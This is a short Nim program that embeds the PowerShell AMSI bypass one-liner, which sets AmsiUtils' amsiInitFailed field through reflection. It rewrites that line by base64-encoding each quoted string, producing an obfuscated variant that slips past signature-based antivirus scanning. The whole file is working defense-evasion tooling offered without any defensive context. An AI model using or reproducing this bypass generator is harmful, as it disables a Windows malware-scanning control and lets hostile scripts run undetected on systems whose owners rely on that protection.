import std/base64

const 
    amsi_bypass = r"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

var
    cur_string: string = ""
    amsi_obf: string = ""
    parsing_string: bool = false
    parsing_identifier: bool = false

proc obfuscate_string(s: string): string =
    # TODO fix
    # base64 encode and decode
    echo "[*] base64 encoding " & s
    return "$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('" & base64.encode(s) & "')))"

when isMainModule:
    echo "###################################################"
    echo amsi_bypass & " ..."
    echo "###################################################"

    var i = 0
    while i < len(amsi_bypass)-1:

        if amsi_bypass[i] == '\'':
            parsing_string = true
            cur_string = ""
            i += 1
            while amsi_bypass[i] != '\'': # string ends
                cur_string = cur_string & amsi_bypass[i]
                i += 1
            amsi_obf = amsi_obf & obfuscate_string(cur_string)
            parsing_string = false
            i += 1

        amsi_obf = amsi_obf & amsi_bypass[i]

        i += 1

    amsi_obf = amsi_obf & amsi_bypass[i]

    echo amsi_obf